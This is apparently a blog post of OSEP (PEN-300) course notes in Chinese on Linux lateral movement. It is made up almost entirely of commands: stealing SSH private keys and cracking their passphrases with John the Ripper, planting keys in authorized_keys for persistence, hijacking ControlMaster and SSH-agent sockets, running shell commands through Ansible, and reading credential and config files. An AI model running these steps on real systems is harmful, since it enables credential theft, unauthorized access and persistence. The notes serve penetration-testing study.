---
title: OSEP-14-Linux横向移动
description: '14-横向移动 | 04-Linux横向移动'
pubDate: 2026-01-30T00:02:19+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Linux Machine
  - Active Directory
  - Lateral Movement
---

# Linux横向移动技术

## 1. SSH密钥窃取

### 查找私钥文件
```bash
# 查找默认命名的私钥
find /home/ -name "id_rsa"

# 以root权限查看其他用户目录
ls -al /home/linuxvictim/
```

### 检查私钥是否有密码保护
```bash
# 查看私钥文件头部
cat svuser.key
# 如果包含 "Proc-Type: 4,ENCRYPTED" 则有密码保护
```

### 查看已知主机
```bash
cat ~/.ssh/known_hosts
```

### 查看bash历史记录
```bash
tail .bash_history
```

### 解析主机名
```bash
host controller
```

---

## 2. SSH密钥密码破解

### 使用ssh2john转换密钥格式
```bash
python /usr/share/john/ssh2john.py svuser.key > svuser.hash
```

### 使用John the Ripper破解
```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt ./svuser.hash
```

### 使用窃取的密钥连接
```bash
# 设置正确的权限
chmod 600 svuser.key

# 使用密钥连接
ssh -i ./svuser.key svuser@controller
```

---

## 3. SSH持久化

### 生成SSH密钥对
```bash
ssh-keygen
```

### 将公钥添加到目标authorized_keys
```bash
echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali" >> /home/linuxvictim/.ssh/authorized_keys
```

### 使用密钥连接
```bash
ssh linuxvictim@linuxvictim
```

---

## 4. SSH ControlMaster劫持

### 创建ControlMaster配置 (~/.ssh/config)
```
Host *
        ControlPath ~/.ssh/controlmaster/%r@%h:%p
        ControlMaster auto
        ControlPersist 10m
```

### 设置配置文件权限
```bash
chmod 644 ~/.ssh/config
```

### 创建controlmaster目录
```bash
mkdir ~/.ssh/controlmaster
```

### 查看socket文件
```bash
ls -al ~/.ssh/controlmaster/
```

### 作为同一用户劫持连接
```bash
ssh offsec@linuxvictim
```

### 作为root用户劫持连接
```bash
ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim
```

---

## 5. SSH-Agent转发劫持

### 客户端配置 (~/.ssh/config)
```
ForwardAgent yes
```

### 服务器配置 (/etc/ssh/sshd_config)
```
AllowAgentForwarding yes
```

### 手动启动SSH-Agent
```bash
eval `ssh-agent`
```

### 添加密钥到SSH-Agent
```bash
ssh-add
```

### 复制公钥到服务器
```bash
ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@controller
ssh-copy-id -i ~/.ssh/id_rsa.pub offsec@linuxvictim
```

### 查找SSH连接进程
```bash
ps aux | grep ssh
```

### 使用pstree查找PID
```bash
pstree -p offsec | grep ssh
```

### 查找SSH_AUTH_SOCK环境变量
```bash
cat /proc/16381/environ
```

### 使用受害者的SSH Agent Socket
```bash
# 列出密钥
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh-add -l

# 使用socket连接
SSH_AUTH_SOCK=/tmp/ssh-7OgTFiQJhL/agent.16380 ssh offsec@linuxvictim
```

---

## 6. Ansible枚举与利用

### 查看Ansible主机清单
```bash
cat /etc/ansible/hosts
```

### Ansible主机清单示例
```ini
[victims]
linuxvictim
```

### 使用Ansible执行命令
```bash
# 以ansibleadm用户身份
ansible victims -m shell -a "whoami"
```

### Ansible配置文件位置
- 主机清单: `/etc/ansible/hosts`
- 全局配置: `/etc/ansible/ansible.cfg`
- 用户配置: `~/.ansible.cfg`

---

## 7. 常用Linux信息收集命令

### 查看系统用户
```bash
cat /etc/passwd
```

### 查看SSH配置
```bash
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
```

### 查看当前用户SSH配置
```bash
cat ~/.ssh/config
```

### 查看authorized_keys
```bash
cat ~/.ssh/authorized_keys
```

### 查看known_hosts
```bash
cat ~/.ssh/known_hosts
```
